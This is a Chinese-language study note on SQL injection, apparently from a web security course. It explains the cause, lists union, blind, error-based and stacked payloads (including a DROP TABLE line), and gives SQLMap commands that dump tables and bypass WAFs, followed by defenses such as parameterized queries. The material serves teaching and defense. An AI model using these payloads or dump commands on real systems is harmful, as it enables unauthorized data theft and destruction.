# SQL 注入


## 收集指南

> ⚠️ **严格范围限定：** 仅收集本章（第1章 SQL注入）相关内容，禁止跨章节引用。

### 条目描述
本文件是《2025Web安全攻防》中关于「SQL注入」的知识原子文件，属于网络安全方向。

### 知识结构
- SQL 注入原理
- 注入类型
- 注入检测
- 自动化工具
- 防御措施

### 待收集原子知识点
- 注入攻击原理
- 联合查询/盲注/报错注入
- SQLMap 使用
- 预编译与参数化查询
- WAF 与输入验证

## 核心知识点

### 一、SQL 注入原理

- **根本原因：** 将用户输入直接拼接到 SQL 语句中，未做任何过滤或转义

```python
# 危险代码（字符串拼接）
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
# 输入 username = "' OR '1'='1' --" 即可绕过认证

# 安全代码（参数化查询）
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

### 二、注入类型

- **联合查询注入（Union-based）：**
  ```sql
  ' UNION SELECT 1,username,password FROM users --
  ```

- **布尔盲注（Boolean-based blind）：**
  ```sql
  ' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a' --
  # 通过页面返回 true/false 逐字符猜解
  ```

- **时间盲注（Time-based blind）：**
  ```sql
  ' AND IF(1=1, SLEEP(5), 0) --
  # 通过响应延迟判断条件真假
  ```

- **报错注入（Error-based）：**
  ```sql
  ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
  ```

- **堆叠查询（Stacked queries）：**
  ```sql
  '; DROP TABLE users; --
  # 数据库支持多语句执行时可用
  ```

### 三、SQLMap 自动化工具

```bash
# 基础检测
sqlmap -u "http://example.com/page?id=1"

# POST 请求
sqlmap -u "http://example.com/login" --data="username=admin&password=123"

# 指定参数
sqlmap -u "http://example.com/page?id=1&name=test" -p id

# 枚举数据库
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" -D mydb --tables
sqlmap -u "http://example.com/page?id=1" -D mydb -T users --dump

# 绕过 WAF
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between
```

### 四、防御措施

```python
# 1. 参数化查询（最有效）
# Python + MySQL
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Java + JDBC
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

# 2. ORM 框架（自动参数化）
User.objects.filter(id=user_id)  # Django
userRepository.findById(userId)  # Spring Data

# 3. 输入验证
import re
def validate_id(value):
    if not re.match(r'^\d+$', value):
        raise ValueError("Invalid ID")
    return int(value)

# 4. 最小权限原则
# 应用数据库用户只授予必要权限，禁止 DROP/ALTER
# GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_user'@'%';

# 5. WAF（Web Application Firewall）
# ModSecurity、云 WAF 等
```

### 五、最佳实践

- **永远使用参数化查询或 ORM**，不要拼接 SQL
- **输入验证：** 白名单验证优于黑名单过滤
- **错误处理：** 不要将数据库错误信息暴露给用户
- **最小权限：** 数据库用户只授必要权限
- **定期更新：** 保持数据库和框架版本最新
- **安全审计：** 定期进行代码审计和渗透测试
